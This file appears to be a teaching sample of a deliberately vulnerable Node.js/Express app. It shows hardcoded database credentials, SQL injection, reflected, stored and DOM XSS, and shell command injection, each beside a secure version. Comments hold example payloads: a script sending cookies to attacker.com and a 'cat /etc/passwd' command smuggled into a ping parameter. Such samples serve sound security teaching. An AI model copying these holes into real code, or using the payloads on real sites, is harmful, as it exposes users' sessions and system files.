/**
 * VULNERABLE SAMPLE: SQL Injection & XSS (Node.js / Express)
 * Kategori: OWASP A03:2021 - Injection
 *           OWASP A03:2021 - XSS
 */

const express = require('express');
const mysql = require('mysql2');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const db = mysql.createConnection({
  host: 'localhost',
  user: 'root',
  password: 'password123',      // VULNERABILITY: Hardcoded credentials
  database: 'myapp'
});


// ============================================================
// SQL INJECTION
// ============================================================

// VULNERABLE: SQL Injection via string concatenation
app.get('/user', (req, res) => {
  const username = req.query.username;
  
  // VULNERABILITY: Input langsung dimasukkan ke query
  const query = `SELECT * FROM users WHERE username = '${username}'`;
  db.query(query, (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});

// VULNERABLE: SQL Injection via search
app.get('/search', (req, res) => {
  const searchTerm = req.query.q;
  
  // VULNERABILITY: String concatenation dalam LIKE query
  const query = "SELECT * FROM products WHERE name LIKE '%" + searchTerm + "%'";
  db.query(query, (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});

// SECURE: Parameterized Query
app.get('/user/secure', (req, res) => {
  const username = req.query.username;
  
  // SECURE: Menggunakan parameterized query dengan ?
  const query = 'SELECT * FROM users WHERE username = ?';
  db.query(query, [username], (err, results) => {
    if (err) throw err;
    res.json(results);
  });
});


// ============================================================
// CROSS-SITE SCRIPTING (XSS)
// ============================================================

// VULNERABLE: Reflected XSS
app.get('/greet', (req, res) => {
  const name = req.query.name;
  
  // VULNERABILITY: Input langsung dimasukkan ke HTML tanpa encoding
  // Attack: /greet?name=<script>document.location='https://attacker.com?c='+document.cookie</script>
  res.send(`<html><body><h1>Hello, ${name}!</h1></body></html>`);
});

// VULNERABLE: Stored XSS (disimpan ke DB, lalu ditampilkan)
app.post('/comment', (req, res) => {
  const comment = req.body.comment;
  const userId = req.body.userId;
  
  // VULNERABILITY: Comment disimpan tanpa sanitasi
  const query = `INSERT INTO comments (user_id, content) VALUES ('${userId}', '${comment}')`;
  db.query(query, (err) => {
    if (err) throw err;
    res.send('Comment saved!');
  });
});

// VULNERABLE: DOM-based XSS via innerHTML
app.get('/profile', (req, res) => {
  const bio = req.query.bio;
  
  // VULNERABILITY: innerHTML digunakan tanpa sanitasi
  res.send(`
    <html>
    <body>
      <div id="profile"></div>
      <script>
        // VULNERABILITY: Menggunakan innerHTML dengan data dari URL
        document.getElementById('profile').innerHTML = '${bio}';
      </script>
    </body>
    </html>
  `);
});

// SECURE: Escaping output untuk mencegah XSS
function escapeHtml(unsafe) {
  return unsafe
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
}

app.get('/greet/secure', (req, res) => {
  const name = req.query.name;
  
  // SECURE: Escape HTML sebelum dimasukkan ke response
  const safeName = escapeHtml(name || '');
  res.send(`<html><body><h1>Hello, ${safeName}!</h1></body></html>`);
});


// ============================================================
// COMMAND INJECTION (Node.js)
// ============================================================

const { exec } = require('child_process');

// VULNERABLE: Command Injection
app.get('/ping', (req, res) => {
  const host = req.query.host;
  
  // VULNERABILITY: exec dengan string concatenation
  // Attack: /ping?host=google.com; cat /etc/passwd
  exec(`ping -c 4 ${host}`, (error, stdout) => {
    res.send(stdout);
  });
});

// SECURE: execFile dengan argument array
const { execFile } = require('child_process');

app.get('/ping/secure', (req, res) => {
  const host = req.query.host;
  
  // Validasi hostname terlebih dahulu
  if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
    return res.status(400).send('Invalid hostname');
  }
  
  // SECURE: execFile dengan argument array, tanpa shell interpolation
  execFile('ping', ['-c', '4', host], (error, stdout) => {
    res.send(stdout);
  });
});


app.listen(3000, () => console.log('Server running on port 3000'));
module.exports = app;
